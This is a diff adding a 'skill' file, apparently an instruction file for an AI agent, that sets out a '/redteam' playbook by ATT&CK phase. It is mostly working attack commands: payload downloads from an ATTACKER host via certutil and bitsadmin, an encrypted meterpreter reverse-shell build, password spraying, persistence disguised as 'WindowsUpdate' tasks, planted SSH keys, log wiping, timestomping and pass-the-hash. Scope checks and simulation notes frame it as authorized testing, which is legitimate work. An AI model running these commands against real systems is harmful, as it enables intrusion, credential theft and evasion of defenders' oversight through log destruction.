@@ -1,0 +1,235 @@
+# Skill: /redteam — WRAITH Mode
+
+## Trigger
+User types `/redteam` or session mode = redteam
+
+## Core Philosophy
+Simulate real threat actor. Stealth > speed. MITRE ATT&CK aligned. Test blue team, not just systems.
+
+---
+
+## Pre-Op Checklist
+
+Before any action:
+```bash
+# Confirm ROE
+cat state/roe.txt  # Rules of Engagement
+
+# Deconfliction check
+python3 tools/deconflict.py --check
+
+# Scope verify
+python3 tools/scope.py $TARGET
+
+# Kill switch confirmed?
+# (emergency stop contact with client CISO)
+```
+
+---
+
+## Phase 1: Reconnaissance (T1595, T1589, T1591)
+
+### Passive (OSINT — No direct contact with target)
+```bash
+# Domain intel
+whois $TARGET_DOMAIN
+amass enum -passive -d $TARGET_DOMAIN -o raw/$SESSION/amass_passive.txt
+
+# Employee enumeration (LinkedIn, hunter.io)
+theHarvester -d $TARGET_DOMAIN -b linkedin -l 200
+
+# Technology fingerprint (passive)
+# Shodan: org:"$COMPANY_NAME"
+# Censys: parsed.names: $TARGET_DOMAIN
+
+# Breach data
+# haveibeenpwned.com API (for authorized intel only)
+# DeHashed (if client authorizes)
+
+# GitHub leaks
+# site:github.com org:$TARGET_DOMAIN
+# Look for: API keys, configs, internal docs
+```
+
+### Active (Direct contact — log all)
+```bash
+nmap -sn $TARGET_CIDR -oG raw/$SESSION/host_discovery.txt --min-rate 100
+nmap -sV --open -T3 $TARGET -oN raw/$SESSION/service_scan.txt
+# T3 = quieter than T4, less IDS noise
+```
+
+---
+
+## Phase 2: Initial Access Vectors
+
+### External-facing Services
+```bash
+# VPN/Citrix/RDP exposure
+nmap -p 443,4443,8443,3389,10443 $TARGET_RANGE
+
+# Password spraying (CAREFUL: lockout policy check first)
+# Identify lockout threshold from AD or login page
+# Spray at 1 attempt per user per 30min minimum
+crackmapexec smb $TARGET -u raw/$SESSION/users.txt \
+  -p 'Season2024!' --continue-on-success --no-bruteforce
+
+# Exposed services
+crackmapexec smb $TARGET -u '' -p ''  # anonymous SMB
+crackmapexec smb $TARGET --shares       # share enum
+```
+
+### Phishing Simulation (T1566)
+```
+# Document only — requires explicit written approval
+# Typical payloads:
+# - Macro-enabled doc (HTA, VBA)
+# - LNK file pointing to SMB share (credential harvesting)  
+# - Browser-in-the-browser (BitB) phishing page
+# - HTML smuggling
+
+# Infrastructure:
+# - Purchase similar domain (typosquat or homoglyph)
+# - GoPhish for tracking
+# - Valid SSL cert (Let's Encrypt)
+```
+
+---
+
+## Phase 3: Execution (T1059)
+
+```bash
+# Living off the land — use built-in tools
+# Windows:
+certutil.exe -urlcache -f http://ATTACKER/payload.exe c:\windows\temp\p.exe
+bitsadmin /transfer job /download /priority normal http://ATTACKER/file c:\temp\file
+
+# Avoid: powershell.exe (heavily monitored)
+# Prefer: wmic, mshta, rundll32, regsvr32
+
+# Linux:
+# bash, python3, curl, wget — all standard
+
+# Staged payload (avoid AV)
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=$C2_HOST LPORT=443 -f exe \
+  --encrypt aes256 --encrypt-key RANDOM \
+  -o raw/$SESSION/staged.exe
+```
+
+---
+
+## Phase 4: Persistence (T1053, T1078, T1098)
+
+```bash
+# Windows scheduled task
+schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\update.exe" \
+  /sc daily /st 09:00 /ru SYSTEM
+
+# Registry run key  
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
+  /v "OneDriveSync" /d "C:\Users\Public\sync.exe" /f
+
+# Linux cron
+(crontab -l 2>/dev/null; echo "*/15 * * * * /tmp/.update") | crontab -
+
+# SSH authorized key
+echo "ssh-rsa ATTACKER_PUB_KEY" >> ~/.ssh/authorized_keys
+
+# Document ALL persistence in wiki/red_team/persistence.md
+```
+
+---
+
+## Phase 5: Defense Evasion (T1036, T1070, T1027)
+
+```bash
+# Clear logs (document that you did this in report — client needs to know)
+# Windows:
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+
+# Linux:
+> /var/log/auth.log
+> /var/log/syslog
+history -c && history -w
+
+# Timestomping
+touch -t 202001010000 /tmp/backdoor
+
+# Process masquerading
+# Name process like: svchost.exe, explorer.exe
+# Use parent process spoofing
+```
+
+---
+
+## Phase 6: Lateral Movement (T1021, T1550)
+
+```bash
+# ALWAYS scope check before moving to new host
+python3 tools/scope.py $NEW_TARGET || exit 1
+
+# SMB lateral movement
+crackmapexec smb $TARGET_RANGE -u $USER -H $NTLM_HASH \
+  --local-auth --continue-on-success
+
+# WMI exec (quieter than psexec)
+impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET
+
+# Pass the Hash
+impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH
+
+# Pass the Ticket
+impacket-getTGT $DOMAIN/$USER:$PASS
+export KRB5CCNAME=user.ccache
+impacket-psexec $TARGET -k -no-pass
+
+# BloodHound — map attack paths
+bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC_IP --zip
+neo4j start
+# Import zip → find shortest path to Domain Admin
+```
+
+---
+
+## Phase 7: Collection & Exfil Simulation (T1005, T1041)
+
+```bash
+# Data staging (SIMULATION ONLY — no real sensitive data)
+# Identify crown jewel locations
+find / -name "*.kdbx" -o -name "*.pfx" 2>/dev/null  # password DBs, certs
+find / -name "id_rsa" 2>/dev/null  # SSH private keys
+
+# Simulated exfil (document the method, don't actually exfil client data)
+# DNS exfil: iodine / dnscat2
+# HTTPS: blend into normal traffic
+# Note in report: "Attacker could exfil data via [method]"
+```
+
+---
+
+## TTP Logging
+
+After each action:
+```bash
+python3 tools/state.py ttp \
+  --id T1595 \
+  --name "Active Scanning" \
+  --tactic "Reconnaissance" \
+  --result "SUCCESS" \
+  --notes "Discovered 3 web servers, 1 FTP open"
+```
+
+Auto-updates wiki/ttp-matrix.md.
+
+---
+
+## OPSEC Rules
+
+1. Never operate from home IP — use VPS or redirector
+2. Beacon sleep ≥ 60s in business hours
+3. Clean up artifacts before moving to next host
+4. Maintain deconfliction: `python3 tools/deconflict.py --log $ACTION`
+5. Screenshot timestamps for report timeline
+6. Never access out-of-scope systems even if reachable
